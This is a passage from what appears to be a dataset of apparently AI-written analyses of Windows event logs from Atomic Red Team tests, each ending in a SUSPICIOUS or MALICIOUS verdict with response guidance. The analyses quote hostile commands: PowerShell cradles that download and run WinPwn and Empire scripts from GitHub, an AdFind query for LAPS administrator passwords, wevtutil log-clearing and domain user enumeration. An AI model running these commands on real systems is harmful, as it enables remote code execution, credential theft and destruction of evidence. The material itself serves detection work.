- High-level privilege use should be verified against known administrative tasks to ensure it aligns with authorized and expected operations.
- While no definitive evidence of compromise is present, the activities around log clearing, attempted credential access, and the high privileges used require deeper inspection to rule out any malicious intent.

**Guidance on How to Proceed:**
- Investigate the context around logs being cleared: verify with IT or the specific admin whether clearing logs were part of maintenance or could have been unauthorized.
- Conduct a security review of the `admin_test` account, and check recent actions against known changes and approved activities.
- Analyze network data (if available) around the times of these logs for any abnormal outbound communication.
- Increase monitoring for any unexpected or unauthorized privilege elevations and login activities.
- Consider resetting credentials and enhancing security controls if the account or system shows further anomalies.

In conclusion, while there is no concrete evidence of a security breach, the actions captured in the logs should be carefully scrutinized to ensure overall system integrity and safety."
Device Driver Discovery,"### Detailed Analysis of Logs

#### Initial Observations:
- **Processes Executed:** A series of processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, `powershell.exe`, and `driverquery.exe` are executed.
- **User Activity:** Most activities are conducted by the user `SERVER002\admin_test`.
- **Log Clearing Events:** There are multiple events indicating that logs were cleared.
- **Command-line Execution:** Notably, `wevtutil.exe` is used to clear logs, and PowerShell is used to execute system queries (`driverquery`).

#### Suspicious Activities:
1. **Log Clearing with `wevtutil.exe`:** 
   - Events with ID `5` and command-line involving `wevtutil.exe cl Application`, `wevtutil.exe cl System`, and `wevtutil.exe cl `Windows PowerShell` indicate the clearing of logs.
   - Clearing event logs without clear authorization is often a tactic used to hide malicious activity.

2. **High-Integrity Level Processes:**
   - Processes such as `wevtutil.exe` and `conhost.exe` running at High integrity level indicate privileged execution. Not inherently suspicious but given the context of log clearing, it raises concerns.

3. **PowerShell Execution:**
   - `powershell.exe` is used to execute `driverquery /v /fo list, driverquery /si /fo list`.
   - PowerShell is a powerful tool and misuse can indicate malicious intent, but it's also used for legitimate administrative tasks.

4. **Security Log Entries:**
   - Events like `4624` (Logon) and `4672` (Special privileges assigned) at similar times stamp align with other suspicious activities.
   - Event ID `1102` in Security logs indicates that Security log was cleared by `admin_test`.

5. **System Log Time Discrepancies:**
   - Event IDs `24` and `1` in System logs show time change activity, which can sometimes align with suspicious activities to cover tracks.

#### Assessment:
- The repeated use of `wevtutil.exe` for clearing logs, combined with the execution of PowerShell for potentially probing commands, does indicate potential compromise.
- The presence of user privileges assignment, logon events, and privilege escalation at the same timestamps as the log clearing raises significant suspicion.

#### Conclusion:
- **Resolution:** **SUSPICIOUS**
- While specific evidence of widespread malicious activity such as data exfiltration or unauthorized installations isn't distinctly evident, the combination of log clearing, privileged operations, and use of PowerShell for querying raise substantial suspicion.

### Guidance on How to Proceed:
1. **Immediate Measures:**
   - Monitor the `admin_test` account for any further suspicious activities.
   - Restrict privileges of highly sensitive tools and implement multi-factor authentication for privileged accounts.
   - Conduct a thorough review of user `admin_test`'s recent activity and communications.

2. **Further Investigation:**
   - Verify the necessity of the executed commands by `admin_test`.

   - Review firewall and antivirus logs for alerts or anomalies.

3. **Preventive Actions:**
   - Harden system logging to prevent unauthorized log clearing.
   - Regularly audit and review system logs for unauthorized access attempts.
   - Educate internal users about risks and establish a protocol for the legitimate usage of admin resources."
WinPwn - MS17-10,"Upon reviewing the provided logs, several suspicious activities stand out that require attention:

1. **Log File Clearing:**
   - The System, Windows PowerShell, and Security logs were cleared almost simultaneously by the user ""admin_test."" This activity is logged with Event ID 104, 104, and 1102, respectively. Log clearing, especially without a proper explanation or accompanying maintenance activities, can be indicative of a malicious actor attempting to cover their tracks.

2. **Suspicious PowerShell Activity:**
   - The Windows PowerShell logs indicate the execution of a command that downloads and executes a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/`). The use of `Invoke-Expression` (`iex`) with `net.webclient` to download and execute a script from the internet is a common technique used by attackers to deliver and execute potentially malicious code. The script in question is named `WinPwn.ps1`, which is associated with exploitation or penetration testing frameworks.

3. **Time Change Events:**
   - Several logs indicate anomalous time changes (Security Event ID 4616 and Kernel-General Event ID 1). Unexpected changes to the system time could be an attempt to disrupt log timelines or bypass time-based security controls.

4. **Sysmon Logs - Use of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) being executed to clear logs (System, Application, and Security), as corroborated by Sysmon logs, reinforce suspicion around log tampering activities.

5. **Privilege Escalation:**
   - Security Event ID 4672 shows the user ""admin_test"" was granted several high-level privileges, including SeDebugPrivilege, which might have been obtained with malicious intentions.

6. **Network Authentication:**
   - There was a remote logon (LogonType 3) using NTLM (Security Event ID 4624), which might indicate lateral movement attempts.

**Assessment:**

Based on the analysis, the logs exhibit multiple indicators of potentially malicious activity. The combination of clearing logs, executing PowerShell scripts from an external source, privilege escalation, and network authentication anomalies strongly suggests a compromise or ongoing malicious activity.

**Resolution: MALICIOUS**

**Guidance:**

- Immediately isolate Server002 from the network to prevent further malicious activity or lateral movement.
- Initiate a detailed forensic investigation to determine the impact and extent of the breach, focusing on detecting any persistence mechanisms and identifying data exfiltration.
- Review the user activities of ""admin_test"" and verify their access levels. Reset credentials and conduct a full audit of accounts with elevated privileges.
- Conduct a root cause analysis to determine how the malicious activities were possible and patch any vulnerabilities.
- Consider involving law enforcement or cybersecurity incident response teams for advanced threat actor engagement, evidence collection, and remediation.

**Recommendations:**

- Implement stricter PowerShell execution policies and script block logging.

- Harden configurations to ensure auditing of critical security events is enabled and retained appropriately.
- Deploy advanced threat protection tools to detect and respond to such activities in real time."
Port Scan NMap for Windows,"In the analysis of the provided Windows event logs, several activities stand out as potentially suspicious or indicative of malicious behavior:

1. **Log File Clearing Events:**
   - There are multiple events indicating log files were cleared, specifically the `System`, `Windows PowerShell`, and `Security` logs. These actions can be considered suspicious because attackers often clear log files to cover their tracks:
     - System Log: Cleared by user ""admin_test"" (Event ID 104).
     - Security Log: Cleared by ""admin_test"" (Event ID 1102).
     - PowerShell Log: Cleared by ""admin_test.""

2. **Suspicious PowerShell Activity:**
   - PowerShell logs show the execution of `powershell.exe` with the command `nmap 127.0.0.1`, which is unusual as Nmap is a network scanning tool often used for reconnaissance or unauthorized network probing.
   - The execution of a network scanning tool via PowerShell is suspicious, particularly if conducted without authorization.

3. **System and Application Logs:**
   - The installation of Nmap, Npcap Packet Driver, and modifications to system certificates using `certutil.exe` suggest potentially malicious efforts to facilitate further reconnaissance or other unauthorized activities.
   - The Sysmon logs indicate the execution of `wevtutil.exe` to clear logs using command lines such as `""C:\Windows\system32\wevtutil.exe"" cl Security`, which correlates with the clearing of event logs observed earlier.

4. **Driver and Service Installations:**
   - There are entries related to the installation of network drivers like Npcap which might be legitimate; however, combined with other suspicious activities, it warrants further inspection.
   - The installation process appears to be automated or scripted, as evidenced by command line executions with common flags (`/q`, `/S`), indicating potential silent install of utilities.

5. **Potential Privilege Escalation:**
   - There are multiple events with elevated privileges associated with `""TargetUserName"":""SYSTEM""`, and operations involving high-integrity level processes. This may indicate a privilege escalation attempt or misuse of SYSTEM account privileges for unauthorized tasks.

6. **Registry and Scheduled Task Modifications:**
   - The creation of a scheduled task `npcapwatchdog` may suggest persistent access or automated activities set up by a threat actor. These tasks are commonly used in malware persistence mechanisms.

Based on these observations, the logs exhibit significant evidence of potentially malicious activities, particularly unauthorized network scanning and log manipulation. It is important to confirm whether these actions were logged by an authorized administrator or part of a known process.

**Resolution: MALICIOUS**  
Given the indicators of potentially malicious actions, such as event log clearing, unauthorized PowerShell use, and suspicious software installations, the logs strongly suggest a compromise. Immediate measures should include:
- Conducting a thorough forensic investigation.
- Reviewing and securing user accounts with administrative privileges.
- Performing a comprehensive network scan for additional malicious tools or indicators.
- Consulting incident response protocols to prevent further potential damage."
Get-DomainGPO to display group policy information via PowerView,"Upon reviewing the provided Windows event logs, several aspects of suspicious and potentially malicious activity are evident, which merit further focus.

### Analysis and Findings:

1. **Suspicious PowerShell Activity:**
   - The logs show repeated execution of PowerShell with the command `-nop -exec bypass` and inclusion of the `IEX (New-Object Net.WebClient).DownloadString()` command to download and execute scripts from a GitHub URL (related to BC-SECURITY's Empire project). This is highly suspicious as it indicates potential unauthorized remote code execution leveraging PowerShell capabilities. The execution bypasses typical security constraints (`-exec bypass`), which is a common tactic in malicious operations.

2. **Log Clearing Events:**
   - There are logs indicating the clearing of Windows event logs, specifically event ID 1102 for the Security log and event ID 104 for the System and Windows PowerShell logs. This is a strong indicator of malicious activity as attackers often clear logs to cover their tracks after system reconnaissance or compromise actions.

3. **Sysmon Logs and Process Creation:**
   - Multiple Sysmon logs reflect process creations related to PowerShell that echo the suspicious PowerShell activities seen in the PowerShell logs.
   - There's evidence of `wevtutil.exe` clearing logs (via command-line activity), further confirming the previous observation regarding log clearing.

4. **Integrity Level and Parent-Child Process Relationships:**
   - The processes involved in the suspicious activity, including PowerShell and process clearing utilities (`wevtutil.exe`), are executed with high integrity levels, indicating elevated privileges, which can exacerbate potential malicious impact.
   - Parent-child relationships indicate that these activities are executed under the context of a potentially compromised user account `admin_test`, which raises flags regarding user account security.

### Conclusion and Resolution:

- **Resolution: MALICIOUS**

The detected activities are consistent with known malicious tactics, techniques, and procedures (TTPs), including unforeseen PowerShell execution from suspicious URLs, event log manipulation, and process activities observed at elevated privilege levels. These are convincing indicators of compromise (IOC).

### Guidance on How to Proceed:

1. **Immediate Incident Response:**
   - Isolate the affected system (`Server002`) from the network to contain any potential threat.
   - Begin forensic image acquisition of the system to preserve evidence for further analysis.

2. **Credentials and Access Re-evaluation:**
   - Reset passwords and review permissions for the user account `admin_test` and any others with similar levels of access.
   - Investigate possible lateral movement within the network from this compromised account.

3. **Threat Hunting and Monitoring:**
   - Conduct a thorough internal review to ensure no other systems have been impacted.
   - Enhance monitoring on PowerShell and related system utilities to detect similar activities.

4. **Patch and Update Strategy:**
   - Ensure all software is up to date with the latest security patches, particularly those that are leveraged during the attack (like PowerShell).

This investigation prioritizes securing the environment quickly while maintaining awareness and monitoring to mitigate future risks and similar breaches."
Detect Virtualization Environment via WMI Manufacturer-Model Listing (Windows),"Upon reviewing the provided Windows event logs, several activities stand out that warrant further investigation due to the potential of unauthorized or malicious activity.

### 1. Log File Clearing (Event 1102)
- **Event ID 1102**: Indicates that the audit log was cleared. This is a sign of potential malicious activity, as threat actors often clear log files to cover their tracks.
- The log was cleared by the user `admin_test`. While this action may be legitimate, it needs to be verified as it can also represent an attempt to hide unauthorized actions. 

### 2. PowerShell Execution
- Repeated execution of **PowerShell** commands: The executed script is querying the system for virtualization environment characteristics using WMI queries. This behavior might indicate reconnaissance activity to understand the environment, which is common in malicious operations aiming to evade detections in virtual environments.
- The command executed checks for attributes indicating a virtual machine. While the query itself is benign, its context, along with other activities, demands further scrutiny.

### 3. Event Clearing via `wevtutil`
- Several uses of **`wevtutil.exe`** to clear event logs for System, Security, and PowerShell channels. Using `wevtutil` in this manner, especially in a sequence, can indicate an attempt to delete specific event logs to avoid detection.
- Processes related to `wevtutil.exe` were initiated by the `admin_test` account, with high integrity level, which suggests privileged user access.

### 4. Other System Activity
- Multiple instances of routine executables like `hostname.exe` and `whoami.exe` but context needs consideration as part of potential reconnaissance or scripting activity.
- **Time Service Events**: Frequent synchronization events suggest potential tampering with system time settings which can be indicative of anti-forensics measures. 

### Assessment
Given the combination of activities:
- Log file clearings by `admin_test`.
- PowerShell scripting activities looking at the virtualization state.
- Use of `wevtutil.exe` to systematically clear logs suggest potential obfuscation by a user or script.

The coordination of these actions fits the profile of an attempt to conceal malicious activity.

### Determination
- **SUSPICIOUS**: While the activity is not conclusively malicious, the combination of log clearing, PowerShell scripting focused on virtualization checks, and inappropriate use of `wevtutil` suggest improper behavior that is uncommon in regular operations, warranting closer inspection by system audits and a review of account activities on `SERVER002`.

### Guidance
1. **Immediate Actions**:
   - Verify the legitimacy of `admin_test` activities, and authentication logs for anomalies.
   - Audit other systems for any similar actions associated with the `admin_test` account.
   - Review PowerShell execution policies and logs.
   
2. **Monitoring & Mitigation**:
   - Enhance logging particularly around high-integrity access and log-modifying tools.
   - Implement stricter access controls around PowerShell and administrative tools.

3. **Incident Response**:
   - Engage with the system administrators and users to understand if `admin_test`'s actions were legitimate maintenance actions.
   - Consider a full forensic investigation on `SERVER002` to analyze for potential compromises or lateral movement activities. 

Given these observations, further investigation is crucial to either confirm or dispel the notion of malicious intent, ensuring the network's integrity."
Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,"Upon reviewing the provided logs, several behaviors and patterns stand out that warrant deeper analysis. Below is the detailed analysis of the logs highlighting suspicious activities and anomalies:

### Suspicious Behavior Detected:

1. **Log Clearing Events:**
   - **Security Event ID 1102 and System Event ID 104**: The logs indicate that logs from multiple channels (Security, System, and Windows PowerShell) were cleared by the user `admin_test`. 
   - **Sysmon logs show `wevtutil.exe` operations**: Multiple instances where `wevtutil.exe` is used to clear logs, such as ""wevtutil.exe cl Security"" and similar for other log channels.

   Log clearing is particularly suspicious when done outside of regular maintenance and without a legitimate reason, as it can indicate an attempt to cover tracks.

2. **PowerShell Execution with External Tools:**
   - Instances of PowerShell scripts executing `AdFind.exe` from a temporary directory.
   - **PowerShell Event Log** shows execution of: `powershell.exe & {& ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\AdFind.exe"" -h $env:USERDOMAIN -s subtree -f ""objectclass=computer"" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}`.
   
   This behavior is often used for enumeration in a network and can be part of a larger offensive toolset, such as those used in penetration testing frameworks.

### Malicious Indications:

- **Use of AdFind.exe**: This tool is commonly used for Active Directory enumeration in penetration testing and can be indicative of a malicious actor attempting to gather sensitive internal network information.
  
- **Time Change Events**:
   - **Event ID 4616**: Indicates that the system time was modified. Altering system time can be used to manipulate log timelines and interfere with event coherence for forensic examinations.

### Additional Threat Context:
- The user `admin_test` and the presence of tools and activities within directories typically associated with temporary or testing grounds suggest unauthorized or testing activities. The use of offensive tools and techniques under normal
user accounts reinforces the suspicion.

### Assessment and Resolution:
After careful analysis of all logs and the context of activities, the resolution for the observed behavior in the logs is **MALICIOUS**. The activities encompass a series of actions typical in an attacker's kill chain, such as information gathering, potential evasion through log clearing, and the usage of known offensive tools.

### Recommendations:
1. **Immediate Incident Response**: Initiate a comprehensive incident response to confirm potential breaches or malicious activity. This should include host isolation and in-depth analysis of `admin_test` user account activities.
2. **Review of Administrative Actions**: Contact relevant teams to ensure that all administrative actions were authorized and legitimate.
3. **Audit and Strengthen Access Controls**: Evaluate the permissions and access paths available to users, especially for administrative functions.
4. **Enhance Monitoring and Alerting**: Improve monitoring to provide alerts for similar log-clearing commands, unusual PowerShell executions, and time change events.
5. **Conduct a Full Network Sweep**: Look for more signs of penetration and ensure no persistence mechanisms have been installed on the systems involved."
View available share drives,"### Detailed Analysis

#### Security Log
- **Event ID 1102**: Indicates that the event log has been cleared. This action is usually a strong indicator of malicious activity, as attackers often clear logs to cover their tracks. The user involved is `SERVER002\admin_test`.
  
#### System Log
- **Event ID 104**: The event logs for the System and Windows PowerShell have been cleared by the same user `admin_test`. This action further correlates with potentially malicious activities as log clearing is significant when it occurs across multiple channels on a system.

#### Sysmon Log
- **Process Execution with 'wevtutil.exe'**: Multiple instances of `wevtutil.exe` are seen clearing logs. This utility is standard for managing Windows event logs, but its repeated use for clearing logs (`cl` command) aligns with the log-clearing entries seen in the security and system logs.
  
- **Command Execution with Context**:
  - `cmd.exe` executing the `net share` command. This could be benign, but in the context of log clearing and potential malicious activity, it could indicate credential enumeration or network information gathering.
  
- **Miscellaneous Executions**: Various system processes like `MpCmdRun.exe`, `wuauclt.exe` related to updates and Windows Defender activities appear normal but should be reviewed in context with suspicious activities.

#### Application Log
- **Event ID 15**: Shows Windows Defender is active, which is a routine log and does not highlight any direct compromise.

#### Windows PowerShell Log
- **No Available PowerShell Logs**: The absence of available logs might be due to them being cleared, hinting at an intentional removal of potential traces by a suspect user.

### Assessment
Based on the analysis, there are clear indicators of suspicious activity primarily due to the log-clearing actions. Such activity is common in attempts to hide unauthorized actions on a system and needs specific attention. Process executions that include enumeration and potential manipulation further align toward indicative malicious patterns.

### Resolution
- **MALICIOUS**: The combination of these activities, particularly the clearing of logs without clear justification and coupled with command-line actions that suggest potential reconnaissance or configuration change, affirm a strong likelihood of malicious intent.

### Guidance
1. **Immediate Response**:
   - Initiate a containment plan to prevent further potential exploitation.
   - Isolate the affected host (Server002) to restrict any ongoing threats.
   
2. **Further Investigation**:
   - Conduct a detailed forensic analysis on `Server002`, focusing on file changes, system configurations, and any new or altered user accounts.
   - Review similar activities derived from other logs at the corresponding timestamps.

3. **Post-Incident Review & Security Enhancement**:
   - Enhance monitoring and alerting on log clearing events and use of system command utilities such as `wevtutil`.
   - Review and restrict permissions for using log management utilities.
   - Assess and update incident response and forensic processes for quicker detection and response in the future."
Enumerate Remote Hosts with Netscan,"Upon reviewing the provided logs, the following observations and assessments have been made:

### Security Log Analysis

1. **Event ID 1102 - Log File Cleared:**
   - Clearing security logs is a significant red flag, especially when performed by a user account `admin_test`. This action can be an indicator of an attempt to cover tracks post-compromise.

2. **Event ID 5379 - Credential Access Failure:**
   - Multiple 5379 events show credential access failures. These are not unusual in themselves; however, the specific failure with various credential types (e.g., `MicrosoftAccount`, `WindowsLive`, etc.) may indicate attempts at credential abuse or enumeration.

3. **Event ID 4624 and 4672 - Logon and Privilege Use:**
   - Logon as SYSTEM and the privileging use that includes powerful privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others suggest potentially elevated actions were executed.

### Sysmon Log Analysis

1. **Clearing Event Logs:**
   - **wevtutil** commands were used to clear various event logs, including Sysmon and Application logs, repeatedly by the `admin_test` user. This further suggests an attempt to remove traces of potentially malicious activities.

2. **Execution of Suspicious Commands:**
   - The execution of a PowerShell command which runs a network scanner (`netscan.exe`) in the `/hide /auto` mode indicates suspicious activity possibly probing internal network devices, which could be part of lateral movement or reconnaissance.

3. **Execution of Various Native System Binaries:**
   - Such executions like `whoami`, `hostname`, and `cmd.exe` are consistent with post-exploitation activities, suggesting attempts to gather information about the system environment and context.

### System and PowerShell Log Analysis

1. **Repeated Invocation of Windows PowerShell:**
   - PowerShell scripts being executed with external payloads suggest an advanced persistent threat (APT)-like behavior, potentially part of a red teaming exercise or live intrusion.

### Indicators and Concerns

- The combination of cleared logs, execution of system utilities through `wevtutil`, PowerShell commands indicative of network scanning, and unexpected privileged access all suggest highly suspicious behavior.
- This malicious activity could indicate either a red team exercise or real malicious activity trying to steal credentials or gather intelligence from the target system.

### Final Assessment and Resolution

After reviewing these observations, it is prudent to classify this activity as:

**MALICIOUS**

### Recommendations

1. **Immediate Disaster Recovery:**
   - Isolate the affected host `Server002` immediately to prevent further potential information leakage.

2. **Conduct a Full Incident Response:**
   - Make forensic copies of volatile and non-volatile data for further investigation.
   - Identify whether similar patterns exist across other hosts in the environment.

3. **Strengthen Security Measures:**
   - Strictly monitor and control privileged accounts, ensuring logs access is compliant with security policies.
   - Deploy advanced endpoint protection and network monitoring to detect similar future activities.

4. **Review Access Permissions and MDM Policies:**
   - Ensure that accounts, like `admin_test`, are audited regularly for inappropriate privilege assignments and cleaned as necessary.

5. **Verify if Red Team Exercise:**
   - Engage with IT and security teams to confirm if the observed activities align with known and documented red teaming efforts to prevent unnecessary escalations."
Peripheral Device Discovery via fsutil,"Upon reviewing the provided event logs, here are the primary observations and my assessment:

1. **Log Clearance Events**: There are multiple indications in the logs that the logs themselves have been cleared:
   - System Log Event ID 104: Indicates that the system and Windows PowerShell logs were cleared by the user ""admin_test"".
   - Security Log Event ID 1102: Indicates that the security log was cleared by the same user.

   **Interpretation**: Clearing logs can be indicative of an attempt to cover tracks, especially if performed without prior authorization or notification.

2. **Kernel-General and Time Change Events**: Several Kernel-General events show changes in the system time:
   - Event ID 1: NewTime and OldTime attributes suggest time adjustments.

   **Interpretation**: Unusual or unauthorized changes to system time may be used to manipulate timestamps on logs or scheduled tasks to disguise malicious activity.

3. **Process Execution Patterns**:
   - Execution of typical administrative or system-related commands like `hostname.exe`, `whoami.exe`, `fsutil.exe`, and `wevtutil.exe`.
   - These executables are common and can be used for legitimate purposes; however, they could be used collectively to gather environment information or manage logs.

4. **EdgeUpdate and Process Activity**:
   - Edge Update and setup executables are frequently executed and involve activities such as installation or service registration. These processes mainly execute with `NT AUTHORITY\SYSTEM` privileges.
   - Systems periodically perform updates, but the sheer number and consecutive execution of the EdgeUpdate processes might suggest abnormal behavior if not part of a scheduled update or administrative tasks.

   **Interpretation**: If this was not part of a known system update or maintenance routine, the pattern might still indicate standard process activity for maintaining the Edge browser, especially since they refer to official Microsoft software.

**Assessment**:

- **Log Clearance**: The clearing of logs, specifically the system, Windows PowerShell, and security logs, by ""admin_test"" without explanation or scheduled maintenance raises a serious suspicion.
- **Time Adjustments**: Time changes can be part of legitimate system processes but paired with log clearing, they add to the suspicion.
- **Process Patterns**: While the processes executed appear native and have legitimate uses, the context of their execution amidst cleared logs and time changes requires scrutiny.

**Resolution**: **SUSPICIOUS**

The activities recorded in the logs indicate a concern due to the log wiping, time adjustments, and potentially unauthorized execution of native services. Further investigation should be conducted into user ""admin_test"", the approval or justification for log clearance, network traffic analysis during these events, and verification against maintenance schedules. Ensure proper collection of system state details before any reboots or log tampering."
Enumerate all accounts via PowerShell (Domain),"Upon reviewing the provided Windows event logs, several events stand out as potentially suspicious or inconsistent with typical administrator activities:

1. **Clearing of Event Logs**:
   - The `wevtutil.exe` command-line utility is frequently invoked with arguments to clear logs (e.g., `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, etc.). The use of `wevtutil.exe` to clear multiple logs, especially those critical for security monitoring (e.g., Security, System, and Application logs), is a red flag indicating an attempt to conceal actions. 

2. **PowerShell Execution**:
   - There is an execution of a PowerShell command with the specific command line: `""powershell.exe"" & {net user /domain, get-localgroupmember -group Users, get-aduser -filter *}`. Such usage typically indicates reconnaissance activity, aiming to gather information about users and groups on the system and the domain. This could be indicative of privilege escalation attempts or lateral movement preparation.

3. **Net and Net1 Commands**:
   - The execution of `net.exe user /domain` and `net1.exe user /domain` suggests enumeration activities to collect domain-wide user information. This behavior aligns with reconnaissance typical in an attack where the actor seeks to map domain users and affiliation.

4. **User**:
   - All suspicious activity occurs under the context of the user `SERVER002\\admin_test`. While actions performed by this user have a ""High"" integrity level due to administrative privileges, the sequence and intent of these commands are unusual for legitimate administrative duties.

5. **System Time Manipulation**:
   - There are entries indicating system time adjustments (`EventID 4616` and manipulated `Kernel-General` events). Altering system time could disrupt time-stamped logs and tamper detection mechanisms, further an indicator of malicious intent.

**Assessment**:
These actions collectively strongly suggest deliberate attempts to cover tracks, perform reconnaissance, and potentially escalate privileges or prepare for further malicious actions on the network. The combination of log clearing, exploratory PowerShell commands, and user enumeration through net commands all point to steps commonly seen in the lateral movement or privilege escalation phases of an attack.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- **Immediate Incident Response**: Isolate the affected host (Server002) from the network to prevent further activity by the attacker.
- **User Account Review**: Investigate the `admin_test` account for any unauthorized access or creation details and consider temporarily disabling it.
- **Log Retention**: Verify if any secure backups exist for the cleared logs to regain visibility into past actions. Leverage other logs or SIEM solutions that might have captured related events.
- **Forensic Analysis**: Perform a thorough forensic analysis on the server to uncover any remaining indicators of compromise, malware, or suspicious files.
- **Review Network Traffic**: Analyze network logs for any communications that indicate data exfiltration attempts or connections to known malicious endpoints.
- **Enhance Monitoring**: Increase monitoring and alerting on similar behaviors across all systems and adjust security baselines to detect `wevtutil.exe` command misuse and unusual PowerShell executions.
- **User Education**: Review administrative user activity protocols and enforce least privileged access principles to minimize risks."
System Information Discovery with WMIC,"### Detailed Analysis of the Logs

#### Observance and Findings

1. **Frequent Execution of `whoami.exe` and Other Utilities:**
   - The execution of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` is observed multiple times while running under the user `SERVER002\admin_test`. These utilities are native to Windows and often used for gathering information about the current user, system name, and manipulating event logs, respectively.
   - **Suspicion:** While running these commands is not inherently malicious, their combined frequent usage suggests an attempt to gather system-level information or prepare for further actions.

2. **Event Log Clearing:**
   - The system and security logs were cleared by the `SERVER002\admin_test` user, as indicated by the `EventID: 104` in the System log and `EventID: 1102` in the Security log. Event log clearing typically is done to cover tracks following unwanted activities.
   - **Suspicion:** This raises significant concern as clearing logs can be indicative of malicious intent to hide unauthorized activities or evidence of compromise.

3. **Use of `cmd.exe` and `wmic.exe`:**
   - There is usage of `cmd.exe` to execute a series of `wmic` commands to gather detailed system information. Commands like `wmic cpu get name`, `wmic MEMPHYSICAL get MaxCapacity`, etc., are employed.
   - **Suspicion:** This could be benign if related to legitimate system administration activities but could also signal reconnaissance by an adversary to assess the system environment.

4. **Execution of `MicrosoftEdgeUpdate.exe`:**
   - The `MicrosoftEdgeUpdate.exe` process seems to be executing under the guise of performing updates.
   - **Benign Assessment:** This matches the typical behavior of an update process, and per log data, it executes as the `NT AUTHORITY\SYSTEM` user, which aligns with update or system maintenance tasks.

5. **High Integrity Level Operations:**
   - The executed processes have high integrity levels, indicating they may be carrying out operations requiring elevated privileges.
   - This generally aligns with an administrative activity but poses risk if the integrity level is misused.

6. **Security Log Event ID 1102:**
   - This specific event indicates the Security log was cleared, likely to hide any recorded unauthorized access or activity.

#### Assessment

The provided logs exhibit activity patterns that may suggest suspicious activity, primarily due to the event log clearing, the frequent use of system utilities like whoami, hostname, and wmic, alongside high integrity operations under an administrator account. While some behaviors can be associated with benign administrative tasks, the combination of cleared event logs and detailed system information gathering through `wmic` commands points towards potential preparatory steps for malicious behavior or execution of an existing malicious plan.

### Resolution: **SUSPICIOUS**

#### Guidance on How to Proceed

1. **Further Investigation is Required:**
   - Conduct a more detailed forensic analysis of the system `Server002` to uncover potential unauthorized activities.
   - Review changes in user accounts, especially `SERVER002\admin_test`, and verify if the requisite security policies are still intact.

2. **Analyze Network Traffic:**
   - Network logs can provide further insights into any command and control communications or data exfiltration activities conducted by the threat actor.

   - Reinstate logging capabilities and ensure that logs are backed up regularly to mitigate against tampering.

5. **User Awareness and Training:**
   - Reinforce organizational training for users on the misuse of administrative accounts and unauthorized data gathering activities.

6. **Monitor for Future Incidents:**
   - Closely observe `SERVER002` for any recurring suspicious activity to ensure swift identification and response to potential threats."
PowerView ShareFinder,"In analyzing the provided Windows event logs, there are several points of interest that may indicate suspicious or malicious behavior.

### Windows PowerShell Logs:
1. **PowerShell Command Execution**:
   - The PowerShell logs indicate the execution of a script from `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\\PowerView.ps1`. This script is part of the ""Atomic Red Team"" framework, which is commonly used for threat simulation and red teaming exercises. While this is not inherently malicious, in a production environment without explicit consent or justification, its presence could indicate reconnaissance activity particularly if not authorized.
   - **Command Used**: `Invoke-ShareFinder -CheckShareAccess` - This function is a part of PowerView used to enumerate network shares which suggests the enumeration of accessible shares on the network, a common reconnaissance task.

### System Logs:
1. **Event Logs Cleared**:
   - Logs show clearing of event logs (Event ID 104 for System and PowerShell channels). The user `admin_test` executed these actions. Clearing event logs can be a sign of attempting to cover tracks post-exploitation.

### Security Logs:
1. **Time Changes**:
   - Event ID 4616 indicates the change of system time by `LOCAL SERVICE`. Although legitimate, it could be used to modify timestamps to evade detections.
2. **Logs Cleared in Security Channel**:
   - Event ID 1102 indicates that the Security logs were cleared, which aligns with potential cover-up activities by the same `admin_test` user account.

### Sysmon Logs:
1. **PowerShell Execution**:
   - Sysmon logs concur with PowerShell execution showing the use of the `PowerView.ps1` script which triggers detections across multiple security solutions when used without explicit authorization.
2. **Event Log Clearing Processes**:
   - Multiple entries show the execution of `wevtutil.exe` to clear logs by the `admin_test` account, further corroborating potential attempts to obfuscate activity.

### Assessment:
- There is a combination of PowerShell script execution indicative of reconnaissance, coupled with actions that could indicate an attempt to evade detection (log clearing activities). Such behavior, especially when unauthorized or unexpected, is suspicious.

### Conclusion:
- **Resolution: SUSPICIOUS** - The activity requires further investigation. The use of `PowerView.ps1`, its execution patterns, and associated log clearing are suspicious. While none of the activities alone are definitive of a malicious attack, combined they suggest potential unauthorized reconnaissance and track-covering activities. Further investigation into the justification of use and audit of `admin_test` user activities is warranted. It is crucial to determine if these actions were part of a sanctioned testing or if they indicate a potential security breach.

### Recommendation:
- Conduct an audit on the `admin_test` user account to determine if the actions were authorized.
- Verify if the execution of Atomic Red Team simulations was scheduled or planned.
- Monitor for any new suspicious activities on the network, especially around enumerations and further log clearing attempts.
- If not part of a sanctioned test, consider isolating affected hosts for a deep forensic analysis to identify any indicators of compromise."
WinPwn - Morerecon,"Upon reviewing the provided logs, several points of concern suggest potential malicious activity or at least warrant further investigation:

1. **PowerShell Activity**: 
   - There is a PowerShell command that downloads and executes a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t`). This behavior is often associated with attempts to download and run potentially harmful scripts, especially when the source is a public repository.
   - The use of `iex(new-object net.webclient).downloadstring()` is a known tactic for downloading and executing code in memory, bypassing traditional security measures.

2. **Security Log - Event Log Clearing**:
   - Event ID 1102 indicates that the security event log was cleared by a user named `admin_test`. This is suspicious because clearing logs can be an attempt to erase traces of malicious activities.

3. **Security Log - Privileged Logon**:
   - Event ID 4672 shows `admin_test` acquiring high privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are indicative of potential unauthorized privilege escalation.

4. **Sysmon Log - Event Log Clearing**:
   - Multiple instances of `wevtutil.exe` clearing different logs (Application, System, Security, Windows PowerShell) were recorded. This is notably alarming because it aligns with efforts to cover tracks after malicious activity.

5. **Process Execution**:
   - The process execution pattern shows consistent high integrity level executions by `admin_test` using legitimate Windows utilities (`wevtutil.exe`, `powershell.exe`) in a sequence that suggests log clearing and potential script execution.

